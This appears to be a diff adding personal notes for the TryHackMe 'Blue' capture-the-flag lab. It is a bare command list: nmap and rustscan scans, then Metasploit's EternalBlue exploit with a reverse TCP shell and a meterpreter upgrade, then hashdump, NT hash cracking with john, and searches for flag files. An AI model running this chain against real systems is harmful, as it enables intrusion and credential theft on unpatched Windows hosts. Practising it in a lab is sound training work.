@@ -1,0 +1,50 @@
+rustscan -a 10.10.117.140
+nmap -p 21,22,80 -sV 10.10.117.140 
+nmap -p 21,22,23,25,53,80,110,137,138,139,143,443,445,548,587,993,995,1433,1701,1723,3306,5432,8008,8443 -sV 10.10.117.140 
+
+nmap -sS -Pn -A -p- -T5 $ip
+nmap -sV -sC --script vuln 10.10.184.191
+
+ls -la /usr/share/nmap/scripts | grep -e "smb-"
+nmap --script=smb* 10.10.10.10
+
+
+msfconsole
+search ms17–010 type:exploit
+use exploit/windows/smb/ms17_010_eternalblue
+options
+set RHOSTS 10.10.10.10
+set payload windows/x64/shell/reverse_tcp
+run
+
+search shell_to_meterpreter
+use post/multi/manage/shell_to_meterpreter
+show options
+run
+sessions -l
+sessions -i 1
+
+getmysystem
+shell
+whoami
+ps
+migrate <ID>
+
+hashdump
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+cd C:\\
+cat flag.txt
+search -f flag2.txt
+cd Windows\\system
+cd Windows\\system\\config
+cd Users\\
+ls
+cd Jon\\
+cd Documents\\
+ls
+cat flag3.txt
+
+https://medium.com/@timnik/tryhackme-blue-writeup-walkthrough-with-answers-e80b1e1e0c5d
+https://freedium.cfd/https://medium.com/@JAlblas/tryhackme-blue-walkthrough-d369bac41982
+
